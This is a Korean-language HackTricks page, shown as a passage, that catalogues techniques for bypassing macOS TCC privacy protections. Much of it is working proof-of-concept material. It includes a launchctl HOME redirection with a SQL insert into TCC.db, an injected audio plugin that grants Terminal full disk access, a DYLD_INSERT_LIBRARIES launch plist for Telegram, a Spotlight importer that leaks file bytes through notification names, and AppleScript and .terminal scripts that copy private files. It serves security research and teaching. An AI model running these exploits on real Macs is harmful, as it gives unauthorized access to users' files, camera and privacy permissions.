# macOS TCC 우회

{{#include ../../../../../banners/hacktricks-training.md}}

TCC grant 저장 및 Automation sender/target attribution에 대해서는 [macOS TCC 개요](../index.html#identify-apple-events-sender-and-target-grants)를 참조하세요.

## 기능별

### 쓰기 우회

이것은 우회가 아니라 TCC가 작동하는 방식일 뿐입니다. **TCC는 쓰기를 보호하지 않습니다**. Terminal이 사용자의 Desktop을 읽을 **수 없어도 해당 위치에 파일을 쓸 수 있습니다**:

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

**확장 속성 `com.apple.macl`**은 새 **파일**에 추가되어 파일을 생성한 **앱이 해당 파일을 읽을 수 있도록** 합니다.<sup>[[2]](#references)</sup>

### TCC ClickJacking

**TCC prompt 위에 창을 띄워** 사용자가 알아차리지 못한 채 **수락**하도록 만들 수 있습니다. [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**에서** PoC를 확인할 수 있습니다.<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC 임의 이름 요청

공격자는 **`Info.plist`**에서 앱의 **이름을 원하는 대로**(예: Finder, Google Chrome...) 지정하고 TCC로 보호되는 위치에 대한 접근을 요청하게 할 수 있습니다. 사용자는 정상 앱이 접근을 요청한다고 생각할 것입니다.\
또한, 정상 앱을 Dock에서 **제거하고 가짜 앱을 Dock에 올려둘 수 있습니다**. 사용자가 가짜 앱(같은 아이콘을 사용할 수도 있음)을 클릭하면 정상 앱을 호출하고 TCC 권한을 요청한 뒤 malware를 실행할 수 있습니다. 이로 인해 사용자는 정상 앱이 접근을 요청했다고 믿게 됩니다.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

자세한 정보와 PoC는 다음에서 확인할 수 있습니다:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

기본적으로 **SSH를 통한 접근에는 "Full Disk Access"가 부여되곤 했습니다**. 이를 비활성화하려면 목록에 표시된 상태로 비활성화해야 합니다(목록에서 제거해도 해당 권한은 제거되지 않습니다).<sup>[[2]](#references)</sup>

![TCC 임의 이름 요청 - SSH Bypass: 기본적으로 SSH를 통한 접근에는 "Full Disk Access"가 부여되곤 했습니다. 이를 비활성화하려면 목록에 표시된 상태로 비활성화해야 합니다(목록에서 제거해도...](<../../../../../images/image (1077).png>)

다음에서 일부 **malware가 이 보호를 우회한 사례**를 확인할 수 있습니다:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> 이제 SSH를 활성화하려면 **Full Disk Access**가 필요합니다.

### 확장자 처리 - CVE-2022-26767

**`com.apple.macl`** 속성은 **특정 애플리케이션에 파일을 읽을 권한을 부여하기 위해** 파일에 추가됩니다. 이 속성은 파일을 앱 위로 **drag\&drop**하거나 사용자가 파일을 **더블클릭**해 **기본 애플리케이션**으로 열 때 설정됩니다.

따라서 사용자는 모든 확장자를 처리하도록 **악성 앱을 등록**하고, Launch Services를 호출해 임의의 파일을 **열 수 있습니다**(그러면 악성 파일에 해당 파일을 읽을 권한이 부여됩니다).<sup>[[23]](#references)</sup>

### iCloud

**`com.apple.private.icloud-account-access`** entitlement를 사용하면 **`com.apple.iCloudHelper`** XPC service와 통신해 **iCloud tokens를 제공받을 수 있습니다**.

**iMovie**와 **Garageband**에는 이 entitlement와 이를 허용하는 다른 entitlement가 있었습니다.

해당 entitlement를 이용해 **icloud tokens를 획득하는** exploit에 대한 자세한 **정보**는 다음 발표를 확인하세요: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### Darwin notification 이름을 통한 Spotlight importer leakage

Spotlight importer는 Spotlight가 `GetMetadataForFile` callback에 전달하는 파일을 읽을 수 있습니다. Full Disk Access가 없는 일반 process는 해당 파일을 읽을 수 없더라도 가능합니다. [TCC 권한이 있는 process에 code injection](../macos-tcc-credential-and-data-theft.md)하는 것과 달리, 이 방법을 사용하려면 importer를 설치하고 이에 맞는 Spotlight indexing event가 발생하도록 할 수 있는 로컬 foothold가 필요합니다. importer는 sandboxed 상태지만, 이름만 사용하는 Darwin notifications를 통해 해당 sandbox 외부의 listener에 bytes를 전달할 수 있습니다. 이는 data-leak 채널이지, importer를 통해 root 권한을 얻거나 임의의 파일에 접근하는 방법은 아닙니다.<sup>[[24]](#references)</sup>

importer의 `Info.plist`에서 `CFBundleDocumentTypes` → `LSItemContentTypes` 아래에 대상 파일 유형을 선언한 다음 bundle을 `~/Library/Spotlight/` 또는 앱의 `Contents/Library/Spotlight/`에 설치합니다. `mdimport -L`로 등록 여부를 확인하세요. [Spotlight importer section](../../../../macos-auto-start-locations.md#spotlight-plugins)에서 bundle 배치와 파일 유형 일치에 대해 설명합니다. importer는 Spotlight가 자신을 선택한 파일만 받으며, 일반적으로 기존 importer가 우선합니다. macOS 26 Tahoe에서 보고된 테스트에 따르면 `mdimport -i`는 즉시 재귀 indexing을 안정적으로 강제하지 않았습니다. 반면 `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter`는 해당 importer가 담당하는 UTI를 다시 가져오도록 요청했습니다.<sup>[[24]](#references)</sup>

채널을 테스트하려면 sandbox 외부에서 `notifyutil -w TEST_TEST_TEST`로 listener를 시작한 다음, `CFNotificationCenterGetDarwinNotifyCenter()`와 `NULL` object 및 `userInfo`를 사용해 notification을 게시합니다. `userInfo` payload를 포함하는 distributed notification과 달리 Darwin notification에는 이름만 있습니다. binary data를 전달하려면 `notify_register_dispatch`를 사용해 외부 listener를 0부터 255까지의 10진수 이름에 등록하고, 각 callback의 등록 항목을 해당 byte 값에 매핑합니다. `GetMetadataForFile` 안에서는 Spotlight가 제공한 `pathToFile`만 읽고 각 byte를 10진수 notification 이름으로 전송합니다:<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

리스너는 TCC로 보호되는 파일 자체를 읽는 대신 바이트 시퀀스를 재구성합니다. 공개된 PoC는 macOS 26에서 SIP가 활성화된 비-FDA 터미널을 통해 `knowledgeC.db`의 첫 64바이트를 복구했습니다. 이는 대역폭이 낮고 대량 복사 방법으로는 신뢰할 수 없습니다. Spotlight가 대상 파일을 인덱싱하거나 재인덱싱하지 않을 수 있으며, 동시에 실행되는 importer 인스턴스가 알림 스트림을 뒤섞을 수 있습니다. 다른 샌드박스 경계 메커니즘은 [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/)를 참조하세요.<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** 권한이 있는 앱은 **다른 앱을 제어**할 수 있습니다. 즉, **다른 앱에 부여된 권한을 악용**할 수 있습니다.<sup>[[2]](#references)</sup>

Apple Scripts에 대한 자세한 내용은 다음을 참조하세요:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

예를 들어, 앱에 **`iTerm`에 대한 Automation 권한**이 있으면 다른 작업을 수행할 수 있습니다. 다음 예시에서는 **`Terminal`**이 iTerm에 대한 접근 권한을 가지고 있습니다:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### iTerm을 통해

FDA 권한이 없는 Terminal은 해당 권한이 있는 iTerm을 호출하여 작업을 수행할 수 있습니다:

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### Finder를 통해

또는 앱이 Finder를 통해 접근할 수 있다면 다음과 같은 스크립트를 사용할 수 있습니다:

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## 앱 동작별

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

사용자 공간의 **tccd daemon**은 **`HOME`** **env** 변수를 사용해 다음 위치에서 TCC 사용자 데이터베이스에 접근합니다: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[이 Stack Exchange 게시물](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)에 따르면, TCC daemon은 현재 사용자의 도메인 내에서 `launchd`를 통해 실행되므로 daemon에 전달되는 **모든 환경 변수**를 **제어할 수 있습니다**.<sup>[[19]](#references)</sup>\
따라서 **공격자는 `launchctl`에서 `$HOME` 환경** 변수를 **제어할 수 있는** **디렉터리**를 가리키도록 설정하고, **TCC** daemon을 **재시작**한 다음, 최종 사용자에게 아무런 프롬프트도 표시하지 않고 **TCC 데이터베이스를 직접 수정**해 사용 가능한 **모든 TCC 권한**을 자신에게 부여할 수 있습니다.<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes는 TCC로 보호되는 위치에 접근할 수 있었지만, 새로 만든 노트는 **보호되지 않는 위치에 저장되었습니다**. 따라서 공격자는 Notes에 보호된 파일을 노트로 복사하도록 요청한 다음, 보호되지 않는 위치에서 복사된 데이터에 접근할 수 있었습니다.

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

라이브러리 `libsecurity_translocate`를 사용하는 바이너리 `/usr/libexec/lsd`에는 **nullfs** 마운트를 만들 수 있게 하는 entitlement `com.apple.private.nullfs_allow`와 모든 파일에 접근할 수 있게 하는 **`kTCCServiceSystemPolicyAllFiles`** entitlement `com.apple.private.tcc.allow`가 있었습니다.

"Library"에 quarantine attribute를 추가한 뒤 **`com.apple.security.translocation`** XPC service를 호출하면 Library가 **`$TMPDIR/AppTranslocation/d/d/Library`**에 매핑되게 할 수 있었으며, 이 위치를 통해 Library 안의 모든 문서에 **접근**할 수 있었습니다.

### CVE-2024-44131 - FileProvider symlink race

파일 작업을 **privileged helper**(여기서는 **`fileproviderd`** / `Files.app`)에 넘기는 앱은 사용자를 **대신해** 항목을 복사하거나 이동하므로, 호출자가 아니라 helper의 권한으로 복사가 실행됩니다.

Jamf Threat Labs는 작업 전에 수행하는 symlink 검증에 **race condition**이 발생할 수 있음을 보였습니다. 검증되는 **마지막** 경로 구성 요소에 symlink를 심는 대신, 복사가 시작된 **후에** 공격자가 경로의 **중간** 디렉터리를 바꿉니다. 그러면 privileged helper가 공격자가 제어하는 링크를 따라가 TCC로 보호되는 위치를 **아무런 prompt 없이** 읽거나 씁니다.<sup>[[5]](#references)</sup>

경로에 임의 UUID가 포함되지 않은 디렉터리(예: `~/Library/Mobile Documents/com~apple~CloudDocs`)는 공격자가 race에 사용할 전체 경로를 예측할 수 있으므로 가장 손쉬운 대상입니다.

> [!TIP]
> 살펴봐야 할 일반적인 패턴은 다음과 같습니다. 경로를 두 번 이상 확인하는 **모든 privileged process**(검사 후 사용하거나, `rename()`/`copyfile()`이 소스와 대상을 각각 확인하는 경우)는 경로 중간의 디렉터리를 바꾸는 방식으로 race condition을 일으킬 수 있습니다. `O_NOFOLLOW_ANY`, 이미 열린 디렉터리 FD를 사용하는 `openat()`, 또는 `realpath()` 실행 후 재검증만이 실제로 이 취약 구간을 차단합니다.

자세한 내용은 [**Jamf Threat Labs writeup**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)을 참고하세요.<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3`는 환경 변수로 제어되는 logging hook을 추가하는 `SQLITE_ENABLE_SQLLOG` 옵션으로 빌드할 수 있습니다 ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **열리는 모든 database**에 대해 **database 파일의 복사본**과 SQL 문 로그를 `path`에 기록합니다(디렉터리가 이미 있어야 합니다).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – DB를 열거나 attach할 때마다 기존 파일을 재사용하는 대신 **새 복사본을 만듭니다**.
- **`SQLITE_SQLLOG_CONDITIONAL`** – 메인 DB 옆에 `<database>-sqllog` 파일이 있을 때만 연결을 로깅합니다.

이 변수를 FDA 권한이 있고 SQLite databases를 여는 process에 주입할 수 있다면, 해당 process는 보호된 databases를 공격자가 제어하는 디렉터리에 **그대로 복사합니다**. 대상 파일 이름이 공격자가 제어하는 데이터에서 파생되므로, 대상 경로에 심어 둔 **symlink**를 이용하면 같은 동작으로 대상 process의 권한을 사용한 **임의 파일 쓰기**도 가능합니다.

### **SQLITE_AUTO_TRACE**

환경 변수 **`SQLITE_AUTO_TRACE`**가 설정되면 라이브러리 **`libsqlite3.dylib`**가 모든 SQL query를 **로깅**하기 시작합니다. 많은 애플리케이션이 이 라이브러리를 사용했기 때문에 해당 애플리케이션의 모든 SQLite query를 로깅할 수 있었습니다.<sup>[[22]](#references)</sup>

여러 Apple 애플리케이션이 이 라이브러리를 사용해 TCC로 보호되는 정보에 접근했습니다.

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### env-var 기반 파일 쓰기 찾기

앞선 두 항목은 같은 일반적인 기법의 사례이므로, 더 찾아볼 가치가 있습니다. **TCC 권한이 있는 앱에 로드되는 framework는 프로세스가 호출자가 제어하는 경로에 파일을 만들게 하는 디버그/로깅 환경 변수를 노출하는 경우가 많습니다.**

찾는 절차:

1. FDA 또는 그 밖의 유용한 TCC 권한이 있는 대상(`Music`, `TV`, `Terminal`, MDM agents...)을 선택하고, 연결된 framework를 나열합니다(`otool -L`, `vmmap`).
2. 해당 framework에서 `getenv` 문자열을 검색합니다: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. `launchctl setenv NAME /path/you/control`로 후보 변수를 설정한 뒤 앱을 실행하고, `fs_usage -w -f filesys <pid>` 또는 `sudo fs_usage | grep <path>`로 파일 시스템에서 앱의 동작을 관찰합니다.
4. 프로세스가 사용자의 디렉터리에 파일을 **생성하거나 이름을 변경**한다면 write primitive를 확보한 것입니다. 목적지를 symlink로 지정하거나(또는 위의 CVE-2024-44131처럼 중간 디렉터리에서 race를 일으켜) 쓰기가 `~/Library/Application Support/com.apple.TCC/TCC.db`로 향하게 합니다.

> [!TIP]
> 이 방법에는 두 가지 제약이 있습니다. 첫째, 앱에 [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement가 포함되어 있지 않으면 hardened-runtime 바이너리에서 **`DYLD_*` 변수는 무시됩니다**. 이 entitlement는 “dynamic linker 환경 변수의 영향을 받아 앱 프로세스에 코드를 주입할 수 있는지 나타내는 Boolean 값”입니다. [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)도 참고하세요. 둘째, Apple은 개별 framework 디버그 변수가 보고되면 제거하므로, 한 macOS 릴리스에서 작동한 변수가 다음 릴리스에서는 사라지는 경우가 많습니다. 변수를 설정한 뒤 앱이 아무 메시지 없이 실행을 거부한다면 해당 변수가 이미 필터링된 것으로 간주하세요.<sup>[[7]](#references)[[8]](#references)</sup>

linker 변수를 이용한 비슷한 기법은 [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)에서 확인하세요.

### Apple Remote Desktop

root 권한으로 이 서비스를 활성화하면 **ARD agent가 전체 디스크 접근 권한을 갖게 됩니다**. 이후 사용자가 이를 악용해 새로운 **TCC 사용자 데이터베이스**를 복사하게 할 수 있습니다.

## **NFSHomeDirectory** 사용

TCC는 사용자별 리소스에 대한 접근을 제어하기 위해 사용자의 HOME 폴더에 있는 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**의 데이터베이스를 사용합니다.\
따라서 사용자가 $HOME 환경 변수가 **다른 폴더**를 가리키도록 한 뒤 TCC를 재시작할 수 있다면, **/Library/Application Support/com.apple.TCC/TCC.db**에 새 TCC 데이터베이스를 만들고 TCC가 모든 앱에 원하는 TCC 권한을 부여하도록 속일 수 있습니다.

> [!TIP]
> Apple은 사용자의 프로필에 저장된 **`NFSHomeDirectory`** 속성 값을 **`$HOME` 값으로 사용합니다**. 따라서 이 값을 수정할 권한(**`kTCCServiceSystemPolicySysAdminFiles`**)이 있는 앱을 침해했다면, TCC bypass를 위해 이 방법을 **weaponize**할 수 있습니다.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**첫 번째 POC**는 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)와 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)를 사용해 사용자의 **HOME** 폴더를 수정합니다.

1. 대상 앱의 _csreq_ blob을 가져옵니다.
2. 필요한 접근 권한과 _csreq_ blob이 포함된 가짜 _TCC.db_ 파일을 심습니다.
3. [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/)로 사용자의 Directory Services 항목을 내보냅니다.
4. Directory Services 항목을 수정해 사용자의 홈 디렉터리를 변경합니다.
5. [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/)로 수정된 Directory Services 항목을 가져옵니다.
6. 사용자의 _tccd_를 중지하고 프로세스를 재부팅합니다.

두 번째 POC는 `kTCCServiceSystemPolicySysAdminFiles` 값을 가진 `com.apple.private.tcc.allow`를 포함한 **`/usr/libexec/configd`**를 사용했습니다.\
**`-t`** 옵션을 사용해 **`configd`**를 실행할 수 있었으며, 공격자는 **로드할 사용자 지정 Bundle**을 지정할 수 있었습니다. 따라서 이 exploit은 사용자의 홈 디렉터리를 변경하는 **`dsexport`** 및 **`dsimport`** 방식을 **`configd` 코드 주입**으로 대체합니다.

자세한 내용은 [**원문 보고서**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)를 확인하세요.<sup>[[11]](#references)</sup>

## 프로세스 주입을 통한 방법

프로세스 내부에 코드를 주입하고 TCC 권한을 악용하는 기법은 다양합니다.


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

또한, 발견된 TCC bypass용 프로세스 주입 중 가장 흔한 방식은 **plugins (load library)**를 이용하는 것입니다.\
Plugins는 일반적으로 라이브러리 또는 plist 형태의 추가 코드로, **메인 애플리케이션이 로드**하며 해당 애플리케이션의 컨텍스트에서 실행됩니다. 따라서 메인 애플리케이션이 부여된 권한이나 entitlement를 통해 TCC 제한 파일에 접근할 수 있다면, **사용자 지정 코드도 해당 파일에 접근할 수 있습니다**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` 애플리케이션은 **`kTCCServiceSystemPolicySysAdminFiles`** entitlement를 보유하고, **`.daplug`** 확장자를 가진 plugins를 로드하며, hardened runtime이 **활성화되어 있지 않았습니다**.

이 CVE를 weaponize하려면 **`NFSHomeDirectory`**를 **변경**(앞서 언급한 entitlement 악용)해 **사용자의 TCC 데이터베이스를 장악하고** TCC를 bypass합니다.

자세한 내용은 [**원문 보고서**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)를 확인하세요.<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

바이너리 **`/usr/sbin/coreaudiod`**는 `com.apple.security.cs.disable-library-validation` 및 `com.apple.private.tcc.manager` entitlements를 보유했습니다. 첫 번째 entitlement는 **코드 주입을 허용**하고, 두 번째 entitlement는 **TCC 관리 권한을 부여**합니다.

이 바이너리는 `/Library/Audio/Plug-Ins/HAL` 폴더에서 **서드파티 plug-ins**를 로드할 수 있었습니다. 따라서 다음 PoC로 **plugin을 로드하고 TCC 권한을 악용**할 수 있었습니다:<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

자세한 내용은 [**원본 보고서**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)를 확인하세요.<sup>[[13]](#references)</sup>

### 장치 추상화 계층(DAL) 플러그인

Core Media I/O를 통해 카메라 스트림을 여는 시스템 애플리케이션(**`kTCCServiceCamera`**가 있는 앱)은 `/Library/CoreMediaIO/Plug-Ins/DAL`에 있는 플러그인을 프로세스에 로드합니다(SIP 제한 대상이 아님).

일반적인 **constructor**가 포함된 라이브러리를 이 디렉터리에 저장하는 것만으로 **코드 주입**이 가능합니다.

여러 Apple 애플리케이션이 이에 취약했습니다.

### Firefox

Firefox 애플리케이션에는 `com.apple.security.cs.disable-library-validation` 및 `com.apple.security.cs.allow-dyld-environment-variables` entitlements가 있었습니다.<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

자세한 내용과 이를 쉽게 exploit하는 방법은 [**원본 보고서 확인**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)을 참고하세요.<sup>[[14]](#references)</sup>

### CVE-2020-10006

바이너리 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl`에는 **`com.apple.private.tcc.allow`** 및 **`com.apple.security.get-task-allow`** entitlements가 있어, 프로세스 내부에 코드를 주입하고 TCC 권한을 사용할 수 있었습니다.

### CVE-2023-26818 - Telegram

Telegram에는 **`com.apple.security.cs.allow-dyld-environment-variables`** 및 **`com.apple.security.cs.disable-library-validation`** entitlements가 있어, 이를 악용해 카메라 녹화 같은 권한에 **접근할 수 있었습니다**. [**writeup에서 payload를 확인할 수 있습니다**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

환경 변수를 사용해 라이브러리를 로드하기 위해 **사용자 지정 plist**를 만들어 해당 라이브러리를 주입하고, **`launchctl`**을 사용해 실행한 점에 주목하세요:<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## open 호출을 통한 실행

sandbox 상태에서도 **`open`**을 호출할 수 있습니다.

### Terminal 스크립트

특히 기술 관련 종사자가 사용하는 컴퓨터에서는 터미널에 **Full Disk Access (FDA)** 권한을 부여하는 경우가 꽤 흔합니다. 이 권한을 사용해 **`.terminal`** 스크립트를 실행할 수도 있습니다.

**`.terminal`** 스크립트는 다음과 같은 plist 파일이며, 실행할 명령은 **`CommandString`** 키에 지정합니다.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

애플리케이션은 /tmp와 같은 위치에 터미널 스크립트를 작성한 다음 다음과 같은 명령으로 실행할 수 있습니다:

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## 마운트하여

### CVE-2020-9771 - mount_apfs TCC bypass 및 privilege escalation

**모든 사용자**(권한이 없는 사용자도 포함)는 Time Machine snapshot을 생성하고 마운트하여 해당 snapshot의 **모든 파일에 접근**할 수 있습니다.\
필요한 **유일한 권한**은 사용되는 애플리케이션(예: `Terminal`)에 **Full Disk Access**(FDA)(`kTCCServiceSystemPolicyAllfiles`) 권한이 있는 것이며, 이 권한은 관리자가 부여해야 합니다.<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

더 자세한 설명은 [**원본 보고서에서 확인할 수 있습니다**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - TCC 파일 위에 mount

TCC DB 파일이 보호되어 있더라도, 새 TCC.db 파일을 **디렉터리 위에 mount**할 수 있었습니다:

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
